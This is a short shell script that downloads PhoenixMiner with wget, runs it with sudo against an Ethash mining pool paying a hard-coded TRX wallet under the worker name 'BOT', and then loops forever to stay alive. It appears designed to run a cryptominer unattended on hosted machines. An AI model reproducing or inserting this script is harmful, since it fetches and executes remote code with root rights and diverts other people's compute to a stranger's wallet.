
#!/bin/sh
apt-get install libpci3 
wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
tar -xf PhoenixMiner_5.6d_Linux.tar.gz  &&cd PhoenixMiner_5.6d_Linux 
sudo ./PhoenixMiner -pool ethash.unmineable.com:3333 -wal TRX:TMzKaWi1k3KadGMV2jfTSeNEZTpTYhjJYN.BOT -pass x  -tt 80 -a coinX -tstop 84 -tstart 74  -fret 2 -rate 1
while [ 1 ]; do
sleep 3
done
sleep 999

